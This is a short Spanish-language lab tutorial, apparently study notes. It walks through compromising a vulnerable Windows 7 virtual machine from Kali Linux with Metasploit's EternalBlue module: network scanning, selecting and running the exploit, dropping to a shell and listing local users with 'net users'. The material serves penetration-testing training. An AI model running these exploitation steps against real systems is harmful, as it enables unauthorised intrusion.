Maquinas que vamos a utilizar Kali Linux y Windows 7 Vulnerable [https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view)

  

vamos a conocer el funcionamiento del comando **net users** para poder ver los usuarios existentes dentro de un sistema Windows, de tal forma que podremos, lo cual nos brindará mucha información para continuar con la post-explotación

  

- Vamos a Comprometer una maquina Windows 7 con Metasploit aprovechando la vulnerabilidad Eternal Blue
    
      
    
    ```Bash
    sudo arp-scan -I eth0 --localnet
    ```
    
    ![[Imagenes/image 60.png|image 60.png]]
    
      
    
- Lanzamos Metaesploit y buscamos eternalblue
    
    `search eternalblue`
    
    ![[Imagenes/image 1 49.png|image 1 49.png]]
    

  

- Escogemos el exploit 0
    
    `use 0`
    
    ![[Imagenes/image 2 48.png|image 2 48.png]]
    
      
    
- Hacemos un show options y rellenamos lo que necesitemos y ejecutamos
    
    `show options`
    
    `set RHOST 10.0.3.6`
    
    `run`
    
    ![[Imagenes/image 3 47.png|image 3 47.png]]
    
      
    
- Nos pasamos a una shell dentro de Windows
    
    `shell`
    
    ![[Imagenes/image 4 45.png|image 4 45.png]]
    

  

- Vamos a probar comando **net user** que no se puede ejecutar cuando estamos en meterpreter:
    - `net users`
        
        ![[Imagenes/image 5 44.png|image 5 44.png]]
        
        Vemos que tenemos tres usuarios , **administrador, Invitado y Mario**.